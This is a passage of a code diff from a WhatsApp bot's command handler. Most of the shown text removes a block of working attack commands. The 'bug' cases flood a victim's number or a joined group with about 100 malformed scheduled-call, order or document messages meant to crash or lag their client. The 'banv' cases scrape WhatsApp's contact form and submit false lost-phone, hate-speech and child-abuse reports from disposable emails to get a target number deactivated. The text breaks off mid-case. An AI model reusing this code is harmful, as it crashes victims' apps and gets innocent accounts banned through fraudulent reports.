+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
             case 'checkaccount':
@@ -9380,897 +12239,7 @@ break
             }
             break
             
-            //bug && war cases 
-//⚠️do not edit cases otherwise bug not work
-//bug cases 
-async function XeonyCrashy(dgxeon,chat) {
-    XeonBotInc.sendMessage(chat, {
-    document: {url: './settings.js'},
-    mimetype: `image/null`,
-    fileName: `${dgxeon}.${xeontext1}` ,
-    caption: `${dgxeon + xeontext1}`,
-    }, {quoted: subscribe_dgxeon })
-    }
-    
-case 'xcrash':{
-    if (!isPremium) return replygcxeon(mess.prem)
-     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-     victim = text.split("|")[0]+'@s.whatsapp.net'
-    amount = "100"
-    for (let i = 0; i < amount; i++) {
-    XeonyCrashy(pushname,victim)
-    await sleep(3000)
-    }
-    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-    }
-    break    
-case 'amountbug': {
-    if (!isPremium) return replygcxeon(mess.premium)
-    if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
-    await loading()
-   victim = text.split("|")[0]+'@s.whatsapp.net'
-   amount = "100"
-   for (let i = 0; i < amount; i++) {
-   const xeonybugx = `${xeontextx}`
-   XeonBotInc.sendMessage(m.chat,
-    { text: `${xeonybugx}`,
-    contextInfo:{
-    forwardingScore: 9999999,
-    isForwarded: true, 
-    "externalAdReply": {
-    "showAdAttribution": true,
-    "containsAutoReply": true,
-    "title": ` ${xeonybugx}`,
-    "body": `${xeonybugx}`,
-    "previewType": "",
-    "thumbnailUrl": ``,
-    "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
-    "sourceUrl": `${websitex}`}}},
-    { quoted: m})   
-   }
-}
-replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
-break
-case 'pmbug' :{
- if (!isPremium) return replygcxeon(mess.premium)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
- await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'delaybug' : {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext2
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'docubug': {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
-await loading()
-if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "15"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'unlimitedbug' : {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext3
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'bombug': {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext4
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'lagbug' : {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext2
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'trollybug': {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "15"
-for (let i = 0; i < amount; i++) {
-var order = generateWAMessageFromContent(from, proto.Message.fromObject({
-"orderMessage": {
-"orderId": "599519108102353",
-"thumbnail": thumb,
-"itemCount": 1999,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"message": `${botname}`,
-"orderTitle": " TROLLY BUG ", 
-"sellerJid": "919339619072@s.whatsapp.net",
-"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
-}
-}), { userJid: from, quoted:m})
-XeonBotInc.relayMessage(victim, order.message, { messageId: order.key.id })
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-}
-break
-case 'gcbug' : {
-if (!isPremium) return replygcxeon(mess.premium)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "100"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'delaygcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "100"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext5
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'laggcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "100"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext2
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'bomgcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await haikal.groupAcceptInvite(result)
-amount = "100"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext4
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'unlimitedgcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "100"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext3
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'trollygcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "15"
-for (let i = 0; i < amount; i++) {
-var order = generateWAMessageFromContent(from, proto.Message.fromObject({
-"orderMessage": {
-"orderId": "599519108102353",
-"thumbnail": thumb,
-"itemCount": 1999,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"message": `${botname}`,
-"orderTitle": " TROLLY BUG ", 
-"sellerJid": "919339619072@s.whatsapp.net",
-"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
-}
-}), { userJid: from, quoted:m})
-XeonBotInc.relayMessage(xeongc, order.message, { messageId: order.key.id })
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'docugcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "15"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-} 
-break
 
-//ban/unban cases
-case 'out': case 'verif':{
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Perdido/roubado: desative minha conta")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv1': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv2': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv3': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv4': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv5': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv6': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'unbanv1': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'unbanv2': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
